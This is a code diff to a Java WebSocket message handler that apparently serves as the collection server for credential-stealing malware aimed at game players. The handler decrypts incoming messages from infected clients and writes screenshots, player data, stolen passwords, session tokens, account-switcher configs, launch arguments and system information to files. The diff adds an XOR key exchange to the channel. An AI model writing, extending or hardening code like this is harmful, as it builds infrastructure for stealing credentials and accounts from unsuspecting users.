@@ -18,8 +18,7 @@ public class MessageHandler {
     private static final Gson GSON = new Gson();
 
     public static void handleRaw(byte[] bytes, WebSocket conn, Server server) {
-        Info info = server.clientMap.get(conn);
-        handle(info.decrypt(bytes, server), conn, server);
+        handle(server.clientMap.get(conn).decrypt(bytes, server), conn, server);
     }
 
     @SuppressWarnings("ResultOfMethodCallIgnored")
@@ -28,6 +27,7 @@ public class MessageHandler {
         server.log("* Received message: " + message + " From ID " + id);
         String msgType = message.messageType();
         String msg = message.message();
+        Info info = server.clientMap.get(conn);
         try {
             switch (msgType) {
                 case "screenshot" -> {
@@ -39,7 +39,7 @@ public class MessageHandler {
                     out.close();
                 }
                 case "skin" -> {
-                    String playerName = server.clientMap.get(conn).playerData.get("playerName").getAsString();
+                    String playerName = info.playerData.get("playerName").getAsString();
                     File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                     new File("skins").mkdir();
                     file.createNewFile();
@@ -58,12 +58,10 @@ public class MessageHandler {
                     out.write((oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                     out.close();
                 }
-                case "player" -> {
-                    server.clientMap.get(conn).playerData = new Gson().fromJson(msg, JsonObject.class);
-                }
+                case "player" -> info.playerData = new Gson().fromJson(msg, JsonObject.class);
                 case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                     String ext = msgType.equals("systeminfo") ? "txt" : "json";
-                    File file = new File("data", getFileName(msgType, ext, server.clientMap.get(conn).playerData.get("playerName").getAsString(), true));
+                    File file = new File("data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
                     new File("data").mkdir();
                     file.createNewFile();
                     FileOutputStream out = new FileOutputStream(file);
@@ -71,7 +69,8 @@ public class MessageHandler {
                     out.close();
                 }
                 case "xor" -> {
-
+                        server.sendUtil.trySend(conn, server, msgType, info.key);
+                    info.acceptXOR = true;
                 }
                 default -> server.log("Message: " + msgType + " " + msg);
             }
